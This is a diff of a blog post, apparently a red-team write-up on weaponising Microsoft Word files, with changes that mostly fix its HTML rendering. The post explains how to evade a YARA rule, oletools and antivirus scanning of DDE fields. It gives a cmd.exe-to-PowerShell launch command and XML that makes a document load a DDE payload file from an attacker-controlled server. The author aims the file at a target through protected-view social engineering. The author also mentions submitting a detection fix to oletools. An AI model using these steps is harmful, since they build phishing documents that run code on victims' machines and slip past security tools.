@@ -135,7 +135,7 @@
 <pre><code>/&lt;w:fldChar\s+?w:fldCharType=&quot;begin&quot;\/&gt;.+?\b[Dd][Dd][Ee]\b.+?&lt;w:fldChar\s+?w:fldCharType=&quot;end&quot;\/&gt;/
 </code></pre>
 
-<p>Which worked well on the first batches of malicious docs, but was subsequently bypassed by the multi-line variants. I found another issue with this regex (before reports of the multi-line variants emerged), and reported this to Didier Stevens. When looking into the Office Open XML File format specifications, you&rsquo;ll find that the <strong>fldChar</strong> field is of the &ldquo;Complex Field&rdquo; type and can have an optional attribute. Adding this optional attribute both breaks the YARA rule above, and allows us to use DDE rather than DDEAUTO. This attribute is named <strong>dirty</strong> and have the boolean value <em>true</em> to force an update as described in the specification &ldquo;Specifies that this field has been flagged by an application to indicate that its current results are no longer correct&rdquo;.</p>
+<p>Which worked well on the first batches of malicious docs, but was subsequently bypassed by the multi-line variants. I found another issue with this regex (before reports of the multi-line variants emerged), and reported this to Didier Stevens. When looking into the Office Open XML File format specifications, you&rsquo;ll find that the <strong>fldChar</strong> field is of the &ldquo;Complex Field&rdquo; type and can have an optional attribute. Adding this optional attribute both breaks the YARA rule above, and allows us to use DDE rather than DDEAUTO. This attribute is named <strong>dirty</strong> and has the boolean value <em>true</em> to force an update as described in the specification &ldquo;Specifies that this field has been flagged by an application to indicate that its current results are no longer correct&rdquo;.</p>
 
 <p>This is the same attribute I used above in the QUOTE field to force updating of values. To add it to the document, simply do as before and modify the .docx manually.</p>
 
@@ -175,65 +175,65 @@
         &lt;w:t&gt;Pew&lt;/w:t&gt;
     &lt;/w:r&gt;
 &lt;/w:fldSimple&gt;
-````
-
-This gives us our auto executing DDE, and we bypass Oletools;
-
-![Oletools bypass](/assets/oletools_dde_bypass.png)
-
-I've made a [Pull Request](https://github.com/decalage2/oletools/pull/205) for an update to oletools to detect DDE links embedded in **fldSimple** elements.
-
-This also stacks up pretty well against [AV](https://www.virustotal.com/#/file/0f8bc14e32928ec882948977b25483a993fb8b4d9c8bc542aa13ecfbde785837/detection) 
-
-![AV bypassed](/assets/dde_av_bypass.png)
-
-Remember that behaviour based AV should be detecting this once the payload executes, so these results should be taken as &quot;bypass or static scanning&quot;.
-
-### Side Effects
-
-There are also some side effects that creep in when using fldSimple. If you decide to go with **DDEAUTO** AND include ```w:dirty=&quot;true&quot;```, the end user will be prompted 3 times (not sure why three and not two) if they want to execute the DDE application. This does mean you have three chances of them hitting &quot;yes&quot; rather than the usual one. 
-
-Interestingly when launching powershell using the fldSimple and ```c:\\windows\\system32\\cmd.exe /k powershell```, the powershell will be launched inside the cmd window, dropping you straight into the powershell console. This is the same behaviour you would get if you ran powershell from within an existing cmd instance. Unlike the usual DDE that spawns cmd AND powershell. And you'll receive a message of &quot;Cannot load PSReadline module. Console is running without PSReadline&quot; (screenshot). Maybe someone would be interested in digging into this?
-
-![PSReadline](/assets/dde_powershell_fldsimple.png)
-
-## No DDE
-
-Now the ultimate win would be to have no **DDE** or **DDEAUTO** in the document at all, is this possible? It sure is, and has the added benefit of sweetening the Social Engineering aspect. MSWord is nice enough to ask the user to disable protected view in order to see the document contents.
-
-For this, we can abuse another legacy feature (aren't these great). At one point in time Word was billed as a one-stop shop for anything text related, this included creating web pages. Word was an IDE for HTML at one point, the HTML was never pretty but it worked. One of the things introduced around this time was the idea of **frames** and **framesets**. Frames allowed you to load different HTML/Text pages into frames within Word, the HTML was automatically parsed and turned into Word formated content. This functionality seems to have been removed from the UI in Word 2016 (possibly earlier as well), but the underlying parsing routines still remain. This means if you create a document with embedded frames, Word will still process them for you.
-
-To insert a frameset you need to go back to editing a clean .docx. First unzip and then open **webSettings.xml**. You then want to modify add the new XML element **frameset**:
 </code></pre>
 
-<p><w:frameset>
-    <w:framesetSplitbar>
-        <w:w w:val="60"/>
-        <w:color w:val="auto"/>
-        <w:noBorder/>
-    <a href="/w:framesetSplitbar">/w:framesetSplitbar</a>
-    <w:frameset>
-        <w:frame>
-            <w:name w:val="1"/>
-            <w:sourceFileName r:id="rId1"/>
-            <w:linkedToFile/>
-        <a href="/w:frame">/w:frame</a>
-    <a href="/w:frameset">/w:frameset</a>
-<a href="/w:frameset">/w:frameset</a></p>
+<p>This gives us our auto executing DDE, and we bypass Oletools;</p>
 
-<pre><code>This should go inside the existing ```&lt;w:webSettings&gt;``` element, right before the ```&lt;w:optimizeForBrowser/&gt;&lt;w:allowPNG/&gt;``` elements. Next you'll need to add **rId1** the relationship that links our document to the external document. 
-This is done by adding a new file to `word/_rels/` called, `webSettings.xml.rels`.
+<p><img src="/assets/oletools_dde_bypass.png" alt="Oletools bypass" /></p>
 
-The contents of this file should be:
+<p>I&rsquo;ve made a <a href="https://github.com/decalage2/oletools/pull/205">Pull Request</a> for an update to oletools to detect DDE links embedded in <strong>fldSimple</strong> elements.</p>
+
+<p>This also stacks up pretty well against <a href="https://www.virustotal.com/#/file/0f8bc14e32928ec882948977b25483a993fb8b4d9c8bc542aa13ecfbde785837/detection">AV</a></p>
+
+<p><img src="/assets/dde_av_bypass.png" alt="AV bypassed" /></p>
+
+<p>Remember that behaviour based AV should be detecting this once the payload executes, so these results should be taken as &ldquo;bypass or static scanning&rdquo;.</p>
+
+<h3 id="side-effects">Side Effects</h3>
+
+<p>There are also some side effects that creep in when using fldSimple. If you decide to go with <strong>DDEAUTO</strong> AND include <code>w:dirty=&quot;true&quot;</code>, the end user will be prompted 3 times (not sure why three and not two) if they want to execute the DDE application. This does mean you have three chances of them hitting &ldquo;yes&rdquo; rather than the usual one.</p>
+
+<p>Interestingly when launching powershell using the fldSimple and <code>c:\\windows\\system32\\cmd.exe /k powershell</code>, the powershell will be launched inside the cmd window, dropping you straight into the powershell console. This is the same behaviour you would get if you ran powershell from within an existing cmd instance. Unlike the usual DDE that spawns cmd AND powershell. And you&rsquo;ll receive a message of &ldquo;Cannot load PSReadline module. Console is running without PSReadline&rdquo; (screenshot). Maybe someone would be interested in digging into this?</p>
+
+<p><img src="/assets/dde_powershell_fldsimple.png" alt="PSReadline" /></p>
+
+<h2 id="no-dde">No DDE</h2>
+
+<p>Now the ultimate win would be to have no <strong>DDE</strong> or <strong>DDEAUTO</strong> in the document at all, is this possible? It sure is, and has the added benefit of sweetening the Social Engineering aspect. MSWord is nice enough to ask the user to disable protected view in order to see the document contents.</p>
+
+<p>For this, we can abuse another legacy feature (aren&rsquo;t these great). At one point in time Word was billed as a one-stop shop for anything text related, this included creating web pages. Word was an IDE for HTML at one point, the HTML was never pretty but it worked. One of the things introduced around this time was the idea of <strong>frames</strong> and <strong>framesets</strong>. Frames allowed you to load different HTML/Text pages into frames within Word, the HTML was automatically parsed and turned into Word formated content. This functionality seems to have been removed from the UI in Word 2016 (possibly earlier as well), but the underlying parsing routines still remain. This means if you create a document with embedded frames, Word will still process them for you.</p>
+
+<p>To insert a frameset you need to go back to editing a clean .docx. First unzip and then open <strong>webSettings.xml</strong>. You then want to modify add the new XML element <strong>frameset</strong>:</p>
+
+<pre><code>&lt;w:frameset&gt;
+    &lt;w:framesetSplitbar&gt;
+        &lt;w:w w:val=&quot;60&quot;/&gt;
+        &lt;w:color w:val=&quot;auto&quot;/&gt;
+        &lt;w:noBorder/&gt;
+    &lt;/w:framesetSplitbar&gt;
+    &lt;w:frameset&gt;
+        &lt;w:frame&gt;
+            &lt;w:name w:val=&quot;1&quot;/&gt;
+            &lt;w:sourceFileName r:id=&quot;rId1&quot;/&gt;
+            &lt;w:linkedToFile/&gt;
+        &lt;/w:frame&gt;
+    &lt;/w:frameset&gt;
+&lt;/w:frameset&gt;
 </code></pre>
 
-<p>&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;UTF-8&rdquo; standalone=&ldquo;yes&rdquo;?&gt;
-<Relationships 
-    xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
-    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="http://x.x.x.x/simple.docx" TargetMode="External"/>
-</Relationships>
-```
-Where your target is the .docx file containing the DDE. In this case we are going to load the simple.docx file from the http server at <em>x.x.x.x</em>. Save the all the modified/created files, and update the .docx archive. Now you can send the modified file document to your target and they will open it. Because it has the <em>mark of the web</em> this will be opened in protected view. However, because Word detects that external content is required for the file to display correctly, the contents will be displayed as: &ldquo;Linked files and other functionality has been disabled. To restore this functionality, you must Edit this file.&rdquo; - note that this is the default message from Word, we have no control over this.</p>
+<p>This should go inside the existing <code>&lt;w:webSettings&gt;</code> element, right before the <code>&lt;w:optimizeForBrowser/&gt;&lt;w:allowPNG/&gt;</code> elements. Next you&rsquo;ll need to add <strong>rId1</strong> the relationship that links our document to the external document.
+This is done by adding a new file to <code>word/_rels/</code> called, <code>webSettings.xml.rels</code>.</p>
+
+<p>The contents of this file should be:</p>
+
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
+&lt;Relationships 
+    xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;
+    &lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame&quot; Target=&quot;http://x.x.x.x/simple.docx&quot; TargetMode=&quot;External&quot;/&gt;
+&lt;/Relationships&gt;
+</code></pre>
+
+<p>Where your target is the .docx file containing the DDE. In this case we are going to load the simple.docx file from the http server at <em>x.x.x.x</em>. Save the all the modified/created files, and update the .docx archive. Now you can send the modified file document to your target and they will open it. Because it has the <em>mark of the web</em> this will be opened in protected view. However, because Word detects that external content is required for the file to display correctly, the contents will be displayed as: &ldquo;Linked files and other functionality has been disabled. To restore this functionality, you must Edit this file.&rdquo; - note that this is the default message from Word, we have no control over this.</p>
 
 <p><img src="/assets/externalframe_pv.png" alt="Protected View" /></p>
 
